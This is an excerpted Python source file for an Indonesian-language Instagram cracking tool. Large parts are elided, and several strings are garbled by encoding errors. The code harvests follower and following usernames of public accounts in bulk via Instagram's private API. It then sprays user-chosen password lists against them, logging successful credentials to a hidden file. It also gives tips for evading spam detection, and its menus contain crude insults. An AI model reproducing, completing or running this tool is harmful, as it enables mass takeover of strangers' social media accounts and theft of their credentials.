...
try:
        ...
        print (f" {M}ðŸ˜›{P}sedang install bahan {H}{e.name}, {P}mohon tunggu...")
...
try:
	...
	def waktu():
		...
		now = datetime.now()
		hours = now.hour
		if 00 <= hours < 11:sapa = "Selamat Pagi â˜€"
		elif 11 <= hours < 15:sapa = "Selamat Siang â˜"
		elif 15 <= hours < 18:sapa = "Selamat Sore ðŸŒ¤"
		elif 18 <= hours < 23:sapa = "Selamat Malam ðŸŒœ"
...
def banner():
	os.system('clear')
	prints(Panel(f"""
â•¦â•”â•â•—   â•”â•â•—â•¦â•â•—â•”â•â•—â•”â•â•—â•¦â•”â•   Script  : Xyzon Dev
â•‘â•‘ â•¦â”€â”€â”€â•‘  â• â•¦â•â• â•â•£â•‘  â• â•©â•—   Version : 1.1
â•©â•šâ•â•   â•šâ•â•â•©â•šâ•â•© â•©â•šâ•â•â•© â•©   Github  : github.com/XyzonXD
""",title=f"{P2}{waktu()}",subtitle=f"{P2}Author TianXD",width=60,padding=(0,2),style=f"green")) 
	
#--- USER AGENT 
USN = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 261.0.0.18.106 (iPhone12,1; iOS 16_2; it_IT; it-IT; scale=2.00; 828x1792; 418330231)"
...
class __cek__:
	...
	def cekCOK(self):
		try:
			...
			os.system(self.hapus)
			exit ("%sÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â°ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬%s %s "%(pe,me,i));jeda(2)
	...
	def cekAPI(self,cookie):
		...
		try:
			...
			os.system (self.hapus)
			print ("[{H}ðŸ˜›{P}] anda belum login ");jeda(2)
			self.masuk()
		except (KeyError,ValueError):
			os.system (self.hapus)
			exit (f"[{H}ðŸ˜›{P}] cookie kedaluwarsa ");jeda(2)
		except (AttributeError,UnboundLocalError):
			os.system (self.hapus)
			exit (f"[{H}ðŸ˜›{P}] terjadi kesalahan ");jeda(2)
	...
	def masuk(self):
		...
		rom = input(f'[{H}ðŸ˜›{P}] Pilih : {P}')
		if rom in['']:
			exit (f'[{H}ðŸ˜›{P}] Isi Yang Benar Asu ');jeda(2) 
		
		elif rom in["1","01"]:
			prints(Panel(f"{P2}Wajib gunakan akun tumbal dilarang akun utama",width=50,padding=(0,4),style=f"green"))
			kukis = input(f"[{H}ðŸ˜›{P}] Cookies : {H}")
			if kukis in['']:
				exit (f'{P}[{H}ðŸ˜›{P}] Isi Yang Benar');jeda(2) 
			else:
				try:
					...
					os.system (self.hapus)
					exit (f"{P}[{H}ðŸ˜›{P}] cookie invalid ");jeda(2)
				except requests.exceptions.ConnectionError as konek:
					exit (f"{P}[{H}ðŸ˜›{P}] gagal memuat tidak ada koneksi : {konek}");jeda(2)
			
		elif rom in["2","02"]:
			prints(Panel(f"{P2} Wajib gunakan akun tumbal dilarang akun utama",width=50,padding=(0,4),style=f"green"));exit()
			username = input(f"[{H}ðŸ˜›{P}] Username : {H}")
			password = input(f"[{H}ðŸ˜›{P}] Password : {H}")
			if (username,password) in['']:
				exit (f"[{H}ðŸ˜›{P}] jangan kosong");jeda(2)
			else:
				...
				if x.get('status')=='success':
					...
					#self.cekCOK()
					print('')
					print(f'[{H}ðŸ˜›{P}] login berhasil, jalankan ulang tool nya ketik{M}:\n{P} - {H}python cropt.py');exit()
				elif x.get('status')=='checkpoint':
					exit (f"[{H}ðŸ˜›{P}] akun checkpoint");jeda(2)
				else:
					exit (f"[{H}ðŸ˜›{P}] login gagal, silahkan coba lagi");jeda(2)
					
		elif rom in['3','03']:
			print(f"[{H}ðŸ˜›{P}] buka dengan youtube ")
			os.system(" xdg-open https://youtu.be/77xXYcZMLcA");exit()
		
		elif rom in['0','00']:
			jalan(f'[{H}ðŸ˜›{P}] Sampai jumpa tod :) ');exit()
			
		else:
			exit (f'[{H}ðŸ˜›{P}] isi yang benar');jeda(2)
...
class instagram:
	...
	def logo(self):
		for i in external:
			...
			pelerXD.append(Panel(f"{P2}Nama Pengguna ðŸ‘‰ {H2}{nama}\n{P2}Username Pengguna ðŸ‘‰ {H2}{self.username}\n{P2}Jenis Script ðŸ‘‰ {H2}Private",width=29,padding=(0,2),style=f"green"))
			pelerXD.append(Panel(f"{P2}Pengikut ðŸ‘‰ {H2}{followers}\n{P2}Mengikuti ðŸ‘‰ {H2}{following}",width=30,padding=(0,3),style=f"green"))
			console.print(Columns(pelerXD))
			prints(Panel(f"{P2}Selamat Datang Kontol Yang Bernama {H2}{nama} {P2}Mohon Gunakan Toolsnya Sebaiknya ðŸ˜ŠðŸ™‚",width=60,padding=(0,7),style=f"green"))
	...
	def menu(self):
		self.logo()
		c = input(f'[{H}ðŸ˜›{P}] Pilih : {H}')
		if c in['',' ']:
			exit (f'[{H}ðŸ˜›{P}] isi yang benar');jeda(2)
			
		elif c in['1','01']:
			gan = input (f"{P}[{H}ðŸ˜›{P}] Anda Ingin Crack Massal Id? Y/T: {H}{P}")
			if gan in['']:
				exit (f'[{H}ðŸ˜›{P}] isi yang benar');jeda(2)
			elif gan in['y','Y']:
			...
			gan = input (f"[{H}ðŸ˜›{P}] Anda Ingin Crack Massal Id? Iya/Tidak : ")
			if gan in['']:
				exit (f'[{H}ðŸ˜›{P}] isi yang benar');jeda(2)
			elif gan in['Iya','iya']:
			...
			print("")
			print(f"[{H}ðŸ˜›{P}] Semakin banyak target semakin banyak user yg terkumpul  ")
			try:m=int(input(f'[{H}ðŸ˜›{P}] Jumlah Target :'))
			except ValueError:exit (f'[{H}ðŸ˜›{P}] isi angka bodoh');jeda(2)
			print(f'[{H}ðŸ˜›{P}] dump 1 nama setara dengan{H} 2500{O} username ')
			for i in range(m):
				i+=1
				nama=input(f'[{H}ðŸ˜›{P}] Nama Orang : ')
	...
	def pengikut(self):
		...
		print("")
		print(f"[{H}ðŸ˜›{P}] Pastikan Target Publik Tidak Private ")
		m=input(f"[{H}ðŸ˜›{P}] Username Publik :{H} ")
	...
	def massal_pengikut(self):
		try:
			...
			print("")
			print(f"[{H}ðŸ˜›{P}] Pastikan Target Publik Tidak Private ")
			jum = int(input(f'[{H}ðŸ˜›{P}] Jumlah Target : {H}'))
		except:jum=1
		for t in range(jum):
			t +=1
			user = input(f'[{H}ðŸ˜›{P}] Username Publik : {H}')
	...
	def mengikuti(self):
		...
		print("")
		print(f"[{H}ðŸ˜›{P}] Pastikan Target Publik Tidak Private ")
		m=input(f'[{H}ðŸ˜›{P}] Username Publik : ')
		id=self.idAPI(self.cookie,m)
	...
	def massal_mengikuti(self):
		try:
			...
			print("")
			print(f"[{H}ðŸ˜›{P}] Pastikan target publik tidak private ")
			jum = int(input(f'[{H}ðŸ˜›{P}] jumlah target : '))
		except:jum=1
		for t in range(jum):
			t +=1
			user = input(f'[{H}ðŸ˜›{P}] username publik : ')
			id = self.idAPI(self.cookie,user)
			info = self.GET_following(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
	...
	def idAPI(self,cookie,id):
		try:
			...
			exit (f"[{H}ðŸ˜›{P}] tidak ada koneksi ");jeda(2)
		except Exception as e:
			#os.system(self.hapus)
			exit (f"[{H}ðŸ˜›{P}] username tidak di temukan ");jeda(2)
		return idx
    #--- dump pengikut
	def GET_followers(self,cookie,api,id):
		try:
			...
			if 'pengikut' in menudump:
				...
				for z in range (9999):
					...
					try:
						...
						sys.stdout.write(f"\r{P}[{H}ðŸ˜›{P}] Sedang Mengumpulkan {wr}{len(internal)} {P}id...{P}")
						sys.stdout.flush()
						time.sleep(0.0002)
						try:
							maxid=x_jason['next_max_id']
			...
			os.system(self.hapus)
			exit (f"[{H}ðŸ˜›{P}] gagal mengambil username ");jeda(2)
		return internal
	#--- dump mengikuti
				...
				for z in range (9999):
					...
					try:
						for i in x_jason['users']:
							...
							following.append(username)
						wr = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
						sys.stdout.write(f"\r[{H}ðŸ˜›{P}] sedang mengumpulkan {wr}{len(internal)} {P}id...{P}")
						sys.stdout.flush()
						time.sleep(0.0002)
						try:
							maxid=x_jason['next_max_id']
		...
		try:
			for ba in range(100):
				...
				try:
					...
					sys.stdout.write (f'\r{pu}ÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â°ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬{br} Mengumpulkan User{me} >{hi} {str(len(internal))} ')
			...
			exit (f"%sÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â°ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ %s%s "%(pu,me,e));jeda(2)
		return internal
	...
	def ingfo(self):
		...
		prints(Panel(f"{P2}Hidupkan Mode Pesawat 5 Detik Jika Terdeteksi Spam IP ðŸ˜›",width=80,padding=(0,10),style=f"green"))
	...
	def passwordAPI(self,xnx):
		...
		self.methodku()
		u = input(f'{P}[{B}ðŸ˜›{P}] Pilih Metode : {H}')
		if u in [""]:
			method.append('satu')
		elif u in ["1","01"]:
			method.append('satu')
		...
		c=input(f'[{H}ðŸ˜›{P}] Pilih Password : {H}')
		if c in ["1","01"]:
			...
			print(f"[{H}ðŸ˜›{P}] Gunakan tanda koma ({P},{P}) untuk pemisahan contoh sayang, sayang123, kontol")
			zx=input(f'[{H}ðŸ˜›{P}] Masukan Password : {H}')
				...
				try:
					...
					if "logged_in_user" in str(xyaaXD) or "sessionid" in ses.cookies.get_dict():
						...
						try:
							...
							tree.add(Panel(f"{H2}       Succes-Login{P2}",width=30,padding=(0,2),style=f"green"))
							...
							open('.logCrack','a').write(f'{H}ÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â­({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}ÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â°{H}{respon.text}\n')
							break
						except:
							tree = Tree(" ",guide_style=f"green")
							tree.add(Panel(f"{H2}       Succes-Login{P2}",width=30,padding=(0,2),style=f"green"))
						...
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						tree = Tree("")
						tree.add(Panel(f"{K2}       CheckPoint{P2}",width=30,padding=(0,2),style=f"green"))
						...
						open('.logCrack','a').write(f'{K}ÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â­({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}ÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â°{K}{respon.text}\n')
						break
						...
						prog.advance(des)
						time.sleep(1)
						open('.logCrack','a').write(f'{M}ÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â­({loop}) {user} || {pw}\nÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â°{respon.text}\n{N}\n')
					...
					pass
					open('.logCrack','a').write(f'{N}ÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â­({loop}) {user} || {pw}\nÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â°{respon.text}\n{N}\n')
		loop+=1
